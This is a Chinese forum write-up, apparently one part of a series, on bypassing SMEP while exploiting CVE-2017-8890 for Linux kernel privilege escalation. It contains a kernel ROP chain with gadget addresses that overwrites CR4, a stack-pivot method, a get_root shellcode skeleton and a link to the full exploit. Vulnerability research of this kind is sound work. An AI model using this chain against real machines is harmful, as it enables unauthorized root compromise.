
[exploit地址](https://bbs.kanxue.com/elink@733K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6Y4K9i4c8Z5N6h3u0Q4x3X3g2U0L8$3#2Q4x3V1k6@1K9r3W2F1K9%4W2U0P5q4)9J5c8V1y4h3c8g2)9J5k6o6t1H3x3e0N6Q4x3X3b7^5z5o6V1H3i4K6u0r3j5X3I4G2j5W2)9J5c8X3#2S2M7%4c8W2M7W2)9J5c8Y4g2T1N6h3&6@1N6g2)9J5k6o6p5$3i4K6u0W2x3o6c8Q4x3X3f1I4i4K6t1#2y4o6m8C8k6i4u0F1k6h3I4Q4x3X3b7@1i4K6u0W2x3e0m8Q4x3X3f1H3i4K6u0V1x3e0W2Q4x3V1k6W2P5s2m8Q4x3X3c8F1L8%4y4E0k6i4m8Q4x3X3g2U0)

![Alt text](https://bbs.kanxue.com/./upload/attach/201901/730610_3D3CWDH9D3C9TGC.png)

## bypass SMEP

SMEP是，位于`CR4`寄存器的第20位。开启了`smep`后，`kernel`就不难直接执行用户态的`shellcode`了。查看`smep`是否开启：`cat /proc/cpuinfo | grep smep`

运行之前的`exp`，内核`oops`信息如下：

![Alt text](https://bbs.kanxue.com/./upload/attach/201901/730610_PV9KFXQE8T3QFMC.png)

这里使用了内核`rop`的方式修改了`CR4`寄存器。

```
0xffffffff810b402d : pop rdi ; ret

0x00000000000406f0  # new CR4 value

0xffffffff8101b5b0 : mov cr4, rdi ; pop rbp ; ret
```

由于使用内核`rop`，因此需要迁移栈。

控制`EIP`时，`rax`是`0x1000002a`。因此栈迁移`xchg eax, esp ; ret`,测试了一下这条指令会修改`esp`，并且`rsp`的高位会清零。因此内核栈`rsp=0x1000002a`。

执行完用户态`shellcode`返回时，内核栈便遭到了破坏。因此，`rop`时我保存了`ebp`，在`shellcode`结束时`leave`，这样便可以恢复内核执行流程。`leave`相当于`mov esp，ebp；ret`。因此在`rop`结束时，只要`ebp`是正确的，`leave`指令就可以保证内核栈不会被破坏。

因此，最终的`rop`功能位为，把`rbp` 被保存到`rcx`中，并且修改了`cr4`，跳转到`ret_addr` 也就是用户态的`shellcode`处执行：

```
fake_stack[0] = 0xffffffff811da170; //  pop rsi ; ret

fake_stack[1] = 0xffffffff8148ddcb; //  pop rcx ; ret

fake_stack[2] = 0xffffffff8119a1d7; //  push rbp ; jmp rsi

fake_stack[3] = 0xffffffff810b402d; //  pop rdi ; ret

fake_stack[4] = 0x00000000000406f0;

fake_stack[5] = 0xffffffff8101b5b0; //  mov cr4, rdi ; pop rbp ; ret

fake_stack[6] = 0x81000a00;         //  fake value saved to rbp, not use

fake_stack[7] = ret_addr;
```

用户态`shellcode`需要把`rcx`中的值给`rbp`，执行完`patch`的功能后，`leave`恢复栈再退出。

```
void get_root() {
        asm(
        "mov    %rcx, %rbp;"
        // "mov    %rcx, %rsp;"
        "sub    $0x18,%rsp;"
        ...  PATCH代码
        "nop;"
        "leaveq;" 
        "retq   ;"
        );
}
```

## 一些问题

此外，有几个注意点，大部分已经解决了：

- `ropgadget`寻找出来的`gadget`需要在`IDA`中看一下确定是否真的可以用。
- `gdb`动态调试时，部分指令有时候会变成`int3`，这是由于`gdb`调试造成的副作用。 ![Alt text](https://bbs.kanxue.com/./upload/attach/201901/730610_EG5UVX2H8MP8ATR.png)
- `gdb`动态调试时，会存在其它的`thread`需要保存`rcu_head`到链表中，需要修改`rcu_head`链表中最后一个`rcu_head`中的`next`指针。如果最后一个`rcu_head`已经是在用户态伪造好的的`rcu_head`，就会出现问题。由于其它的`thread`不在`exp`上下文中，因此访问不了`rcu_head`末尾加入的在用户态的`fake mc_list`，地址为`0x1000000a`，直接运行`exp`就没这个问题了，只有调试时会遇到这个问题。![Alt text](https://bbs.kanxue.com/./upload/attach/201901/730610_HC74K4WK7ZV2796.png)
- 当执行用户态`shellcode`时，`kgdb`会挂掉，这时劫持`kdump`看内核`oops`信息，使用方法见之前的环境搭建文章。
- .... 时间跨度太长了，应该还有很多漏掉的....

当然还有一些没解决的：

- 控制`EIP`的过程是在时钟中断触发时，软中断中调用`rcu`的回调函数中触发的，但是软中断的调用有可能是在`exp`的进程上下文中，有可能是在`ksofriqrd`中。`ksoftiqrd`这个线程是内核为了解决大量软中断触发时，减少用户态程序等待时间因而来处理软中断的线程。当回调函数触发时的`thread`处于进程上下文中，是可以访问`exp`在用户态`mmap`的数据的，当`thread`中处于`ksoftiqrd`中，就访问不到`exp`进程用户态`mmap`的数据了就会出现下面这样的错误了： ![Alt text](https://bbs.kanxue.com/./upload/attach/201901/730610_22CCJ4MDS4PNYYC.png)

## exploit

下载：[exploit地址](https://bbs.kanxue.com/elink@222K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6Y4K9i4c8Z5N6h3u0Q4x3X3g2U0L8$3#2Q4x3V1k6@1K9r3W2F1K9%4W2U0P5q4)9J5c8V1y4h3c8g2)9J5k6o6t1H3x3e0N6Q4x3X3b7^5z5o6V1H3i4K6u0r3j5X3I4G2j5W2)9J5c8X3#2S2M7%4c8W2M7W2)9J5c8Y4g2T1N6h3&6@1N6g2)9J5k6o6p5$3i4K6u0W2x3o6c8Q4x3X3f1I4i4K6t1#2y4o6m8C8k6i4u0F1k6h3I4Q4x3X3b7@1i4K6u0W2x3e0m8Q4x3X3f1H3i4K6u0V1x3e0W2Q4x3V1k6W2P5s2m8Q4x3X3c8T1P5i4m8S2M7%4y4K6L8h3g2H3i4K6u0W2j5H3`.`.)

![Alt text](https://bbs.kanxue.com/./upload/attach/201901/730610_3VKGUMTNJQKD4SP.png)

最后，感谢`SetRet`和`thor`两位前辈的文章，当然还有一些其他帮助过我的前辈们。

## REF

1. CVE-2017-8890漏洞分析与利用（Root Android 7.x）

    9d6K9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8X3k6J5k6h3g2T1N6h3k6Q4x3X3g2U0L8$3#2Q4x3V1k6S2M7Y4c8A6j5$3I4W2M7#2)9J5c8Y4c8W2M7X3#2A6L8X3q4D9i4K6u0r3x3e0j5H3x3o6b7I4i4K6u0W2K9s2c8E0L8l9`.`.

2. 利用CVE-2017-8890实现linux内核提权: SMEP绕过

   921K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6^5P5W2)9J5k6h3q4D9K9i4W2#2L8W2)9J5k6h3y4G2L8g2)9J5c8Y4c8Q4x3V1j5J5x3K6R3#2

3. 利用CVE-2017-8890实现linux内核提权: ret2usr

    019K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6^5P5W2)9J5k6h3q4D9K9i4W2#2L8W2)9J5k6h3y4G2L8g2)9J5c8Y4c8Q4x3V1j5J5x3K6R3K6

4. 浅析linux kernel RCU机制

   5b0K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6T1L8r3!0Y4i4K6u0W2j5%4y4V1L8W2)9J5k6h3&6W2N6q4)9J5c8Y4c8Z5K9h3&6C8i4K6g2X3P5h3y4^5i4K6u0r3j5i4u0@1K9h3y4D9k6g2)9J5c8X3c8W2N6r3q4A6L8s2y4Q4x3V1j5^5x3e0p5#2y4e0j5%4x3R3`.`.

[[招生]科锐逆向工程师培训(2026年11月13日实地，远程教学同时开班, 第57期)](https://bbs.kanxue.com/thread-51839.htm)

最后于  2019-1-29 12:25

被心许雪编辑

，原因：
